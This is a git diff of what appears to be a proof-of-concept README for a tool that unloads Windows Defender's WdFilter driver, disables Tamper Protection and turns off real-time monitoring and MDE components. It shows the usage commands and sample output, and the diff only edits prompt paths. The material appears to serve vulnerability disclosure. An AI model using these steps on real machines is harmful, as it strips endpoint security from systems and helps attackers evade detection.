@@ -19,7 +19,7 @@ POC Demo: <https://youtu.be/MI6aVDHRix8>
 The POC works in 3 steps (Admin privileges required):
 
 ```
-C:\Users\User\Desktop> .\Disable-TamperProtection.exe
+C:\> .\Disable-TamperProtection.exe
 Sequential Usage: 1 --> 2 --> 3
 1:      Unload WdFilter
 2:      Disable Tamper Protection
@@ -32,7 +32,7 @@ An example, to use the POC is as follows:
 1) Unload WdFilter:
 
 ```
-C:\Users\User\Desktop> .\Disable-TamperProtection.exe 1
+C:\> .\Disable-TamperProtection.exe 1
 [+] WdFilter Altitude Registry key Value: 328010
 [+] Trusted Installer handle: 0000000000000120
 [!] Spawning registry with TrustedInstaller privileges to delete WdFilter "Altitude" regkey.
@@ -40,7 +40,7 @@ C:\Users\User\Desktop> .\Disable-TamperProtection.exe 1
 [+] Execute option 1 to validate!
 
 # Upon 2nd execution if the above output repeats the target isn't vulnerable
-C:\Users\User\Desktop>.\Disable-TamperProtection.exe 1
+C:\> .\Disable-TamperProtection.exe 1
 [+] WdFilter Altitude Registry key has been successfully deleted.
 [+] Enumerating WdFilter information:
         Next:   0 | Frame ID:   0 | No. of Instances:   4 | Name:        wdfilter | Altitude:          328010
@@ -48,7 +48,7 @@ C:\Users\User\Desktop>.\Disable-TamperProtection.exe 1
 [+] Execute option 1 to validate!
 
 # Restart to crash and unload WdFilter
-C:\Users\User\Desktop>.\Disable-TamperProtection.exe 1
+C:\> .\Disable-TamperProtection.exe 1
 [+] WdFilter Altitude Registry key has been successfully deleted.
 [+] WDFilter has been successfully unloaded, use option 2 to disable Tamper Protection.
 ```
@@ -56,7 +56,7 @@ C:\Users\User\Desktop>.\Disable-TamperProtection.exe 1
 2) Disable Tamper Protection:
 
 ```
-C:\Users\User\Desktop>.\Disable-TamperProtection.exe 2
+C:\> .\Disable-TamperProtection.exe 2
 [+] WdFilter Altitude Registry key has been successfully deleted.
 [+] Trusted Installer handle: 00000000000000C4
 [!] Spawning registry with TrustedInstaller privileges to alter Defender "TamperProtection" regkey from 5 to 4.
@@ -67,7 +67,7 @@ C:\Users\User\Desktop>.\Disable-TamperProtection.exe 2
 3) Disable Defender / MDE components:
 
 ```
-C:\Users\User\Desktop>.\Disable-TamperProtection.exe 3
+C:\> .\Disable-TamperProtection.exe 3
 [+] WdFilter Altitude Registry key has been successfully deleted.
 [+] Trusted Installer handle: 000000000000011C
 [!] Spawning registry with TrustedInstaller privileges to Disable 'RealtimeMonitoring' regkey.
@@ -79,7 +79,7 @@ C:\Users\User\Desktop>.\Disable-TamperProtection.exe 3
 
 ```
 # Restart the computer after execution to restore settings successfully
-C:\Users\User\Desktop>.\Disable-TamperProtection.exe 4
+C:\> .\Disable-TamperProtection.exe 4
 [+] WdFilter Altitude Registry key has been successfully deleted.
 [+] Make sure to change Altitude in Source (Default: 328010) and reboot computer after execution.
 [+] Trusted Installer handle: 0000000000000120
